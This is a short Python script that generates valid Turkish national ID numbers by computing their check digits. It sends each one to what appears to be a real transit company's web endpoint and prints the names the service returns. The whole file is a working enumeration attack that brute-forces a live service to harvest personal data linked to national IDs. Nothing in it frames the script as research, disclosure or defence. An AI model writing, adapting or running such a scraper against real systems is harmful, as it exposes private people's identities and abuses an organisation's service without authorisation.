import requests
import uuid

def go():
    for i in range(100000000, 999999999):
        digits = list(map(int,str(i)))
        s0 = (sum(digits[::2])*7 - sum(digits[1::2])) %10
        s1 = (sum(digits[:9])+s0) %10
        tck = i*100+s0*10+s1
        print(tck)
        r = requests.post("https://budo.burulas.com.tr/tr/Dynamic/TcRequest", {
            "tcIdentity": tck,
            "ticketCategory": str(uuid.uuid4())
        })
        if r.status_code == 200:
            rdata = r.json()
            if rdata.get("Name"):
                print(r.text)

if __name__ == "__main__":
    go()
